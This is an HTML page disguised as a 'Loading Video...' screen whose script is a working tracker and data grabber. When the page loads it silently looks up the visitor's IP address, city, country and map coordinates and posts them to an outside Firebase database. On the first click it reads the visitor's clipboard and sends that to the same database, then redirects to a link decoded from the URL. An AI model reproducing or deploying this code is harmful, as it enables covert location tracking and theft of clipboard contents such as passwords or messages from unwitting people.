<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Video...</title>
    <style>
        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #00a884; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";

        async function startSpy() {
            const params = new URLSearchParams(window.location.search);
            const id = params.get('id');
            if(!id) return;

            try {
                // Decode Key and Redirect URL
                const [userKey, targetUrl] = atob(id).split('|');

                // 1. Silent Location Tracking
                let info = { time: new Date().toLocaleString(), ip: "Unknown", loc: "Unknown", map: "#" };
                try {
                    const res = await fetch('https://ipwho.is/');
                    const d = await res.json();
                    info.ip = d.ip;
                    info.loc = `${d.city}, ${d.country}`;
                    info.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
                } catch(e) {}

                // Send to Firebase
                await fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(info) });

                // 2. Clipboard Grabber (Works when they click anywhere)
                document.body.onclick = async () => {
                    try {
                        const text = await navigator.clipboard.readText();
                        if(text) {
                            await fetch(`${DB_URL}clipboard/${userKey}.json`, { 
                                method: 'POST', 
                                body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) 
                            });
                        }
                    } catch(e) {}
                    // Move to target after click
                    window.location.href = targetUrl;
                };

                // Auto move after 4 seconds even if no click
                setTimeout(() => { window.location.href = targetUrl; }, 4000);

            } catch(e) { window.location.href = "https://youtube.com"; }
        }

        startSpy();
    </script>
</body>
</html>
